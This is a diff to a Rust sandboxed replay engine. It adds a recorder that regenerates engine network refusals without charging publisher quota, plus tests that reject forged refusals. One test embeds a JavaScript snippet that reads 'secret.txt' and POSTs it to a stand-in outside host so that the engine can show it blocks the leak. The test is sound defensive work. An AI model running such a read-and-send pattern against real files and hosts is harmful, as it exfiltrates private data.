@@ -2232,6 +2232,18 @@ mod engine {
     }
 
     /// Re-derive publisher scope and quota decisions before using the tape.
+    /// The engine records this exact denial before entering the product host
+    /// provider for a deferred HTTP request. It consumes no publisher quota.
+    /// A recorded string alone is not evidence of that boundary: scoped replay
+    /// must regenerate it through `RegeneratingReplayRecorder` before accepting
+    /// the transcript. Other denial strings and request families remain ordinary
+    /// provider attempts.
+    fn is_engine_network_refusal(request: &HostIoRequest, outcome: &HostIoOutcome) -> bool {
+        matches!(request, HostIoRequest::NetworkRequest { .. })
+            && matches!(outcome, Err(HostIoError::Denied { reason })
+                if reason == "FLOW_POLICY_BLOCKED")
+    }
+
     /// Every replay consumes this exact sequence; a counterfactual may consume
     /// only its exact prefix. A fresh gate makes invocation budgets independent
     /// of earlier verification attempts and preserves admitted failed attempts.
@@ -2239,6 +2251,7 @@ mod engine {
         ceiling: &EffectiveCapabilityCeiling,
         entries: &[(HostIoRequest, HostIoOutcome)],
         capabilities: &[String],
+        regenerate_engine_refusals: bool,
     ) -> Result<(), String> {
         let authority = PublisherHostAuthority::new(ceiling.clone())
             .map_err(|_| "captured publisher host authority is not enforceable".to_string())?;
@@ -2247,6 +2260,12 @@ mod engine {
             .filter_map(|tag| RuntimeCapability::from_tag_str(tag))
             .collect();
         for (request, outcome) in entries {
+            if regenerate_engine_refusals && is_engine_network_refusal(request, outcome) {
+                // Provisional only: a normal provider request cannot receive
+                // this outcome from the replay recorder. Native execution must
+                // independently emit it before the final verdict can match.
+                continue;
+            }
             // Derive the required grant from the typed request, never from a
             // captured list that could omit the capability being checked.
             let required = request.required_capability();
@@ -2519,6 +2538,7 @@ mod engine {
                     ceiling,
                     &self.host_effect_transcript,
                     &self.package.capabilities,
+                    self.process.is_none(),
                 )?;
             }
             let has_process_authority = self.package.capabilities.iter().any(|capability| {
@@ -2675,6 +2695,141 @@ mod engine {
 
         fn recorded_entries(&self) -> Vec<(HostIoRequest, HostIoOutcome)> {
             self.transcript.recorded_entries()
+        }
+    }
+
+    #[derive(Debug, Default)]
+    struct RegeneratedRefusalState {
+        cursor: usize,
+        active: bool,
+        awaiting_refusal: bool,
+        poisoned: bool,
+    }
+
+    /// Reproduce engine-owned network refusals instead of handing them to an
+    /// ordinary provider request as if it had passed publisher admission.
+    ///
+    /// At a refused slot, `replay` returns no supplied outcome. The native IFC
+    /// path must then emit its own exact refusal through `record`. A normal
+    /// effect reaches only `CapturedReplayHostIo`, whose different constant
+    /// refusal poisons this recorder even if the guest suppresses the error.
+    /// The inner recorder still owns exact request matching, lifecycle and
+    /// suffix exhaustion; the extra state cannot repair its failed verdict.
+    ///
+    /// This adapter is deliberately host-only. The concrete global process
+    /// journal materializes outcomes before execution, so it cannot establish
+    /// this distinction. Those captures retain strict provider accounting.
+    struct RegeneratingReplayRecorder {
+        inner: CapturedReplayRecorder,
+        refusal_indices: BTreeSet<usize>,
+        state: Mutex<RegeneratedRefusalState>,
+    }
+
+    impl std::fmt::Debug for RegeneratingReplayRecorder {
+        fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+            formatter
+                .debug_struct("RegeneratingReplayRecorder")
+                .field("engine_refusals", &self.refusal_indices.len())
+                .finish_non_exhaustive()
+        }
+    }
+
+    impl RegeneratingReplayRecorder {
+        fn new(entries: Vec<(HostIoRequest, HostIoOutcome)>) -> Self {
+            let refusal_indices = entries
+                .iter()
+                .enumerate()
+                .filter_map(|(index, (request, outcome))| {
+                    is_engine_network_refusal(request, outcome).then_some(index)
+                })
+                .collect();
+            Self {
+                inner: CapturedReplayRecorder::new(entries),
+                refusal_indices,
+                state: Mutex::new(RegeneratedRefusalState::default()),
+            }
+        }
+
+        fn refusal() -> HostIoError {
+            HostIoError::Denied {
+                reason: "native replay did not independently reproduce the engine network refusal"
+                    .to_string(),
+            }
+        }
+    }
+
+    impl HostIoRecorder for RegeneratingReplayRecorder {
+        fn filesystem_exception_provenance(&self) -> HostIoExceptionProvenance {
+            self.inner.filesystem_exception_provenance()
+        }
+
+        fn begin_execution(&self) -> Result<(), HostIoError> {
+            let mut state = self.state.lock().map_err(|_| Self::refusal())?;
+            if state.poisoned {
+                return Err(Self::refusal());
+            }
+            if let Err(error) = self.inner.begin_execution() {
+                state.poisoned = true;
+                return Err(error);
+            }
+            state.active = true;
+            Ok(())
+        }
+
+        fn replay(&self, request: &HostIoRequest) -> Option<HostIoOutcome> {
+            let Ok(mut state) = self.state.lock() else {
+                return Some(Err(Self::refusal()));
+            };
+            if state.poisoned || !state.active || state.awaiting_refusal {
+                state.poisoned = true;
+                return Some(Err(Self::refusal()));
+            }
+            if self.refusal_indices.contains(&state.cursor) {
+                state.awaiting_refusal = true;
+                return None;
+            }
+            let outcome = self.inner.replay(request);
+            state.cursor = state.cursor.saturating_add(1);
+            outcome
+        }
+
+        fn record(&self, request: &HostIoRequest, outcome: &HostIoOutcome) {
+            let Ok(mut state) = self.state.lock() else {
+                return;
+            };
+            if state.poisoned
+                || !state.active
+                || !state.awaiting_refusal
+                || !is_engine_network_refusal(request, outcome)
+            {
+                state.poisoned = true;
+                return;
+            }
+            if self.inner.replay(request).as_ref() != Some(outcome) {
+                state.poisoned = true;
+                return;
+            }
+            state.cursor = state.cursor.saturating_add(1);
+            state.awaiting_refusal = false;
+        }
+
+        fn finish_execution(&self) -> Result<Vec<(HostIoRequest, HostIoOutcome)>, HostIoError> {
+            let mut state = self.state.lock().map_err(|_| Self::refusal())?;
+            let finalized = self.inner.finish_execution();
+            if state.poisoned || !state.active || state.awaiting_refusal {
+                state.poisoned = true;
+                state.active = false;
+                return Err(Self::refusal());
+            }
+            state.active = false;
+            if finalized.is_err() {
+                state.poisoned = true;
+            }
+            finalized
+        }
+
+        fn recorded_entries(&self) -> Vec<(HostIoRequest, HostIoOutcome)> {
+            self.inner.recorded_entries()
         }
     }
 
@@ -3613,9 +3768,16 @@ mod engine {
                     .map_err(|error| format!("initialize native replay engine: {error}"))?;
                 orchestrator.set_process_argv(payload.process_argv.clone());
                 orchestrator.set_clock_epoch_ms(payload.clock_epoch_ms);
-                let replay_io = Arc::new(CapturedReplayRecorder::new(
-                    payload.host_effect_transcript.clone(),
-                ));
+                let replay_io: Arc<dyn HostIoRecorder> =
+                    if payload.capability_ceiling.is_some() && payload.process.is_none() {
+                        Arc::new(RegeneratingReplayRecorder::new(
+                            payload.host_effect_transcript.clone(),
+                        ))
+                    } else {
+                        Arc::new(CapturedReplayRecorder::new(
+                            payload.host_effect_transcript.clone(),
+                        ))
+                    };
                 orchestrator.set_host_io(Arc::new(CapturedReplayHostIo), Some(replay_io.clone()));
                 let replay_process_provider = payload.process.as_ref().map(|process| {
                     Arc::new(CapturedReplayProcessProvider::new(
@@ -4255,26 +4417,315 @@ mod engine {
             ];
             let capabilities = vec!["env_read".into()];
             for _ in 0..2 {
-                validate_scoped_transcript(&ceiling, &tape, &capabilities).unwrap();
+                validate_scoped_transcript(&ceiling, &tape, &capabilities, false).unwrap();
             }
             let mut changed = tape.clone();
             changed[1].1 = Ok(HostIoResponse::EnvRead {
                 value: Some("ungranted".into()),
             });
-            assert!(validate_scoped_transcript(&ceiling, &changed, &capabilities).is_err());
+            assert!(validate_scoped_transcript(&ceiling, &changed, &capabilities, false).is_err());
             let mut widened = ceiling.clone();
             widened.max_calls_per_epoch.insert("env_read".into(), 2);
-            assert!(validate_scoped_transcript(&widened, &tape, &capabilities).is_err());
-            assert!(validate_scoped_transcript(&ceiling, &tape, &[]).is_err());
+            assert!(validate_scoped_transcript(&widened, &tape, &capabilities, false).is_err());
+            assert!(validate_scoped_transcript(&ceiling, &tape, &[], false).is_err());
             assert!(
                 validate_scoped_transcript(
                     &ceiling,
                     &[(request, Err(scope_denial))],
                     &capabilities,
+                    false,
                 )
                 .is_err(),
                 "an allowed request cannot retain an invented scope refusal"
             );
+        }
+
+        fn deferred_network_request(endpoint: &str) -> HostIoRequest {
+            HostIoRequest::NetworkRequest {
+                endpoint: endpoint.into(),
+                payload: b"POST / HTTP/1.1\r\n\r\nprivate-input".to_vec(),
+                max_len: 4096,
+                use_tls: true,
+            }
+        }
+
+        fn engine_network_refusal() -> HostIoOutcome {
+            Err(HostIoError::Denied {
+                reason: "FLOW_POLICY_BLOCKED".into(),
+            })
+        }
+
+        #[test]
+        fn scoped_engine_network_refusals_do_not_consume_provider_quota() {
+            let ceiling = scoped_ceiling();
+            let blocked = deferred_network_request("outside-publisher.example.test:443");
+            let admitted = deferred_network_request("api.example.test:443");
+            let provider_failure = Err(HostIoError::Io {
+                detail: "admitted provider attempt failed".into(),
+            });
+            let quota_denial = Err(HostIoError::Denied {
+                reason:
+                    "publisher_authority: host invocation exceeds the admitted scope or call budget"
+                        .into(),
+            });
+            let tape = vec![
+                (blocked.clone(), engine_network_refusal()),
+                (admitted.clone(), provider_failure),
+                (admitted.clone(), quota_denial),
+            ];
+            let capabilities = ["network_egress".into()];
+            validate_scoped_transcript(&ceiling, &tape, &capabilities, true).unwrap();
+            assert!(
+                validate_scoped_transcript(&ceiling, &tape, &capabilities, false).is_err(),
+                "the global process journal cannot establish pre-provider refusal provenance"
+            );
+
+            let mut zero = ceiling;
+            zero.max_calls_per_epoch.insert("network_egress".into(), 0);
+            for request in [blocked, admitted.clone()] {
+                validate_scoped_transcript(
+                    &zero,
+                    &[(request, engine_network_refusal())],
+                    &capabilities,
+                    true,
+                )
+                .unwrap();
+            }
+            for (request, outcome) in [
+                (
+                    admitted,
+                    Err(HostIoError::Denied {
+                        reason: "FLOW_POLICY_BLOCKED: caller supplied".into(),
+                    }),
+                ),
+                (
+                    HostIoRequest::NetworkSend {
+                        endpoint: "api.example.test:443".into(),
+                        payload: vec![],
+                    },
+                    engine_network_refusal(),
+                ),
+            ] {
+                assert!(
+                    validate_scoped_transcript(&zero, &[(request, outcome)], &capabilities, true,)
+                        .is_err(),
+                    "only the exact engine deferred-network refusal may be regenerated"
+                );
+            }
+        }
+
+        #[test]
+        fn regenerating_recorder_requires_native_refusal_and_preserves_exact_order() {
+            let read = HostIoRequest::FsRead {
+                path: "secret.txt".into(),
+            };
+            let read_outcome = Ok(HostIoResponse::FsRead {
+                bytes: b"private-input".to_vec(),
+            });
+            let refused = deferred_network_request("outside-publisher.example.test:443");
+            let tape = vec![
+                (read.clone(), read_outcome.clone()),
+                (refused.clone(), engine_network_refusal()),
+            ];
+            let recorder = RegeneratingReplayRecorder::new(tape.clone());
+            recorder.begin_execution().unwrap();
+            assert_eq!(recorder.replay(&read), Some(read_outcome));
+            assert!(recorder.replay(&refused).is_none());
+            recorder.record(&refused, &engine_network_refusal());
+            assert_eq!(recorder.finish_execution().unwrap(), tape);
+            assert!(recorder.finish_execution().is_err());
+            assert!(recorder.begin_execution().is_err());
+
+            let wrong_order = RegeneratingReplayRecorder::new(tape);
+            wrong_order.begin_execution().unwrap();
+            assert!(matches!(wrong_order.replay(&refused), Some(Err(_))));
+            assert!(wrong_order.finish_execution().is_err());
+
+            for mutation in [
+                "unobserved",
+                "changed-request",
+                "repeated-replay",
+                "extra-record",
+            ] {
+                let recorder = RegeneratingReplayRecorder::new(vec![(
+                    refused.clone(),
+                    engine_network_refusal(),
+                )]);
+                recorder.begin_execution().unwrap();
+                if mutation == "extra-record" {
+                    recorder.record(&refused, &engine_network_refusal());
+                } else {
+                    assert!(recorder.replay(&refused).is_none());
+                    if mutation == "changed-request" {
+                        let changed = deferred_network_request("changed.example.test:443");
+                        recorder.record(&changed, &engine_network_refusal());
+                    } else if mutation == "repeated-replay" {
+                        assert!(matches!(recorder.replay(&refused), Some(Err(_))));
+                        recorder.record(&refused, &engine_network_refusal());
+                    }
+                }
+                assert!(recorder.finish_execution().is_err(), "{mutation}");
+                assert!(recorder.begin_execution().is_err(), "{mutation}");
+            }
+        }
+
+        #[test]
+        fn regenerating_recorder_rejects_forged_refusal_even_after_caught_provider_error() {
+            let request = deferred_network_request("api.example.test:443");
+            let recorder =
+                RegeneratingReplayRecorder::new(vec![(request.clone(), engine_network_refusal())]);
+            recorder.begin_execution().unwrap();
+            assert!(recorder.replay(&request).is_none());
+            // A normal effect may only reach the replay provider's constant
+            // refusal. It cannot obtain the forged IFC outcome from the tape.
+            let backstop = CapturedReplayHostIo.perform(&request, &[HostIoCapability::NetworkSend]);
+            assert_ne!(backstop, engine_network_refusal());
+            recorder.record(&request, &backstop);
+            assert!(matches!(recorder.replay(&request), Some(Err(_))));
+            recorder.record(&request, &engine_network_refusal());
+            assert!(recorder.finish_execution().is_err());
+            assert!(recorder.begin_execution().is_err());
+        }
+
+        #[cfg(unix)]
+        #[derive(Debug)]
+        struct ScopedNetworkFixture {
+            filesystem: SandboxedHostIo,
+            authority: PublisherHostAuthority,
+            network_calls: std::sync::atomic::AtomicUsize,
+        }
+
+        #[cfg(unix)]
+        impl HostIoProvider for ScopedNetworkFixture {
+            fn name(&self) -> &str {
+                "scoped-network-replay-fixture"
+            }
+
+            fn filesystem_exception_provenance(&self) -> HostIoExceptionProvenance {
+                self.filesystem.filesystem_exception_provenance()
+            }
+
+            fn perform(
+                &self,
+                request: &HostIoRequest,
+                granted: &[HostIoCapability],
+            ) -> HostIoOutcome {
+                self.authority.authorize(request, granted)?;
+                if request.is_network() {
+                    self.network_calls.fetch_add(1, Ordering::Relaxed);
+                    return Err(HostIoError::Io {
+                        detail: "fixture transport unavailable after publisher admission".into(),
+                    });
+                }
+                self.filesystem.perform(request, granted)
+            }
+        }
+
+        #[cfg(unix)]
+        #[test]
+        fn scoped_native_replay_regenerates_ifc_refusals_and_rejects_forged_quota_exemptions() {
+            on_native_stack(|| {
+                for (quota, refused_host, public_attempts) in [
+                    (0, "api.example.test", false),
+                    (0, "outside-publisher.example.test", false),
+                    (1, "outside-publisher.example.test", true),
+                ] {
+                    let workspace = tempfile::tempdir().unwrap();
+                    let original = workspace.path().join("original");
+                    std::fs::create_dir(&original).unwrap();
+                    std::fs::write(original.join("secret.txt"), "private-input").unwrap();
+                    let mut ceiling = scoped_ceiling();
+                    ceiling
+                        .max_calls_per_epoch
+                        .insert("network_egress".into(), quota);
+                    let provider = Arc::new(ScopedNetworkFixture {
+                        filesystem: SandboxedHostIo::with_root(&original).unwrap(),
+                        authority: PublisherHostAuthority::new(ceiling.clone()).unwrap(),
+                        network_calls: std::sync::atomic::AtomicUsize::new(0),
+                    });
+                    let followup = if public_attempts {
+                        "const allowed = http.request('https://api.example.test/upload', { method: 'POST' }); allowed.on('error', () => {}); allowed.end('public'); const exhausted = http.request('https://api.example.test/upload', { method: 'POST' }); exhausted.on('error', () => {}); exhausted.end('public');"
+                    } else {
+                        ""
+                    };
+                    let source = format!(
+                        "const fs = require('fs'); const http = require('http'); const secret = fs.readFileSync('secret.txt', 'utf8'); const blocked = http.request('https://{refused_host}/upload', {{ method: 'POST' }}); blocked.on('error', () => {{}}); blocked.end(secret); {followup} fs.writeFileSync('marker.txt', 'allowed-local-effect'); console.log('complete');"
+                    );
+                    let capture = record_frozen_execution(
+                        &original,
+                        &source,
+                        [
+                            "module_load",
+                            "fs_read",
+                            "fs_write",
+                            "network_egress",
+                            "builtin",
+                            "timer",
+                        ]
+                        .into_iter()
+                        .map(str::to_string)
+                        .collect(),
+                        provider.clone(),
+                    )
+                    .with_capability_ceiling(&ceiling)
+                    .expect("bind the actual publisher policy without charging engine refusals");
+                    assert_eq!(
+                        provider.network_calls.load(Ordering::Relaxed),
+                        usize::from(public_attempts),
+                        "the engine refusal never entered the provider; an admitted failure consumes quota"
+                    );
+                    let payload = decode_capture(&capture).unwrap();
+                    assert_eq!(
+                        payload
+                            .host_effect_transcript
+                            .iter()
+                            .filter(|(request, outcome)| is_engine_network_refusal(
+                                request, outcome
+                            ))
+                            .count(),
+                        1,
+                        "the real native engine must emit the deferred refusal"
+                    );
+                    let archived = workspace.path().join("archived");
+                    std::fs::rename(&original, &archived).unwrap();
+                    std::fs::rename(
+                        archived.join("marker.txt"),
+                        archived.join("retained-marker.txt"),
+                    )
+                    .unwrap();
+                    for _ in 0..2 {
+                        let outcome = reexecute(&capture).expect("offline scoped native replay");
+                        assert!(outcome.satisfies_policy_equivalence(), "{outcome:?}");
+                        assert!(!original.exists());
+                        assert!(!archived.join("marker.txt").exists());
+                        assert_eq!(
+                            provider.network_calls.load(Ordering::Relaxed),
+                            usize::from(public_attempts),
+                        );
+                    }
+                    assert_eq!(
+                        std::fs::read_to_string(archived.join("retained-marker.txt")).unwrap(),
+                        "allowed-local-effect"
+                    );
+                    if public_attempts {
+                        let mut forged = payload;
+                        let (_, denied) = forged
+                            .host_effect_transcript
+                            .iter_mut()
+                            .find(|(_, outcome)| {
+                                matches!(outcome,
+                                Err(HostIoError::Denied { reason })
+                                    if reason.starts_with("publisher_authority:"))
+                            })
+                            .expect("the third network request exhausted its real quota");
+                        *denied = engine_network_refusal();
+                        assert!(
+                            reexecute(&encode_capture(&forged).unwrap()).is_err(),
+                            "an ordinary provider attempt cannot impersonate an engine refusal"
+                        );
+                    }
+                }
+            });
         }
 
         #[cfg(unix)]
@@ -4458,6 +4909,24 @@ mod engine {
 
         #[cfg(unix)]
         fn record_frozen_counterfactual(root: &Path, source: &str) -> NativeReplayCapture {
+            record_frozen_execution(
+                root,
+                source,
+                ["module_load", "fs_read", "fs_write", "builtin", "timer"]
+                    .into_iter()
+                    .map(str::to_string)
+                    .collect(),
+                Arc::new(SandboxedHostIo::with_root(root).unwrap()),
+            )
+        }
+
+        #[cfg(unix)]
+        fn record_frozen_execution(
+            root: &Path,
+            source: &str,
+            capabilities: Vec<String>,
+            provider: Arc<dyn HostIoProvider>,
+        ) -> NativeReplayCapture {
             use crate::supply_chain::module_resolution_graph::file_resolution::source_graph::{
                 GraphOptions, capture,
             };
@@ -4481,11 +4950,6 @@ mod engine {
                 )
                 .expect("admit frozen module graph"),
             );
-            let capabilities: Vec<String> =
-                ["module_load", "fs_read", "fs_write", "builtin", "timer"]
-                    .into_iter()
-                    .map(str::to_string)
-                    .collect();
             let policy = Arc::new(CapabilityPolicyHook::new(
                 capabilities
                     .iter()
@@ -4528,7 +4992,7 @@ mod engine {
                 )
                 .unwrap();
             orchestrator.set_host_io(
-                Arc::new(SandboxedHostIo::with_root(root).unwrap()),
+                provider,
                 Some(Arc::new(InMemoryHostIoTranscript::recording())),
             );
             let result = orchestrator
